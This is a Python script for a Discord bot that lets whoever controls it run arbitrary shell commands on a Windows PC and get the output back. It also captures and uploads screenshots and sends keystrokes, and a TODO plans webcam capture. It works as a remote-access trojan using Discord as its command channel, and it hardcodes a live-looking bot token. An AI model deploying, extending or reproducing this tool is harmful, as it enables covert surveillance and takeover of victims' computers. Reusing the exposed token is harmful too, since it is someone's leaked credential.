import os, sys
import discord
import keyboard
import ctypes
from mss import mss

# TODO: Add a webcam capture command that sends pics from webcam!

token = 'MTEzODU0OTQwMzc4Nzk5MzEwOA.GXK6b5.ZAUDFhChyDpGi0qiBEGYxgxLCarQEilrDXtpIo'
bot = discord.Bot()


class funcs:

  def grabScreenshot():
    # Takes a screen shot of all monitors
    for i in range(3):
      mss().shot(mon=i)

  def getTime():
    # Gets computers time
    time = os.popen('time /t').read()
    return str(time)

  def getUptime():
    # Retrieves system uptime
    lib = ctypes.windll.kernel32
    t = lib.GetTickCount64()
    t = int(str(t)[:-3])
    mins, sec = divmod(t, 60)
    hour, mins = divmod(mins, 60)
    days, hour = divmod(hour, 24)
    return (f'{days} days, {hour:02}:{mins:02}')


@bot.event
async def on_ready():
  os.system('cls')
  print('------------------------------------------')
  for guild in bot.guilds:
    print(f'* {guild.name} (ID: {guild.id})')
  print('Status: READY...\n')


@bot.slash_command(name='send-input', description='Sends a input to computer')
async def sendInput(ctx):
  key = 'f15'
  keyboard.press(key)
  await ctx.respond('Input sent')


@bot.slash_command(name='heartbeat', description='Check if PC is still on')
async def heartbeat(ctx):
  await ctx.respond('Response: ' + funcs.getTime())


@bot.slash_command(name='cmd', description='Pass a command to PC')
async def passcmd(ctx, command):
  out = os.popen(command).read()
  if out != '':
    await ctx.send(out)
  else:
    await ctx.send('Command returned a blank string')


@bot.slash_command(name='uptime', description='Get computer uptime')
async def uptime(ctx):
  time = funcs.getUptime()
  await ctx.send(time)


@bot.slash_command(name='screenshot', description='Get a screenshot from the computer')
async def screenshot(ctx):
  funcs.grabScreenshot()
  screen1 = 'monitor-1.png'
  screen2 = 'monitor-2.png'

  with open(screen1, 'rb') as f1:
    picture1 = discord.File(f1)
  with open(screen2, 'rb') as f2:
    picture2 = discord.File(f2)

  await ctx.send('Monitor 1', file=picture1)
  await ctx.send('Monitor 2', file=picture2)
  os.remove(screen1)
  os.remove(screen2)


def start():
  try:
    bot.run(token)
  except Exception as f:
    print(f'Initialization function\'s try block tripped: {f}')
    sys.exit(1)


start()
